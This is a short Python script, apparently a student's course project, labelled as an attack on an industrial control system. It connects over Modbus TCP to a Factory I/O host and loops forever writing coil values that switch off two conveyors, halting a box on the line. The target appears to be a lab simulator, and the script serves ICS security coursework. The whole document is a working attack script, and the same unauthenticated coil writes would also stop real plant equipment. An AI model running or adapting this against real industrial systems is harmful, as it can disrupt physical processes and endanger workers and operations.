# Gabriella Colletti
# Project 2B

# Attack 1
# Attack Description: Turn off both conveyors to prevent the box from moving

def attack1():
    from pymodbus.client.sync import ModbusTcpClient
    # Connecting the TCP Client to the Factory I/O Host
    client = ModbusTcpClient('192.168.56.1', port = 502)
    client.connect()
    unit1 = 0x1

    while True:
        client.write_coil(0,False,unit=unit1) # Turn off CONVEYOR A
        client.write_coil(1,False,unit=unit1) # Turn off CONVEYOR B



attack1()
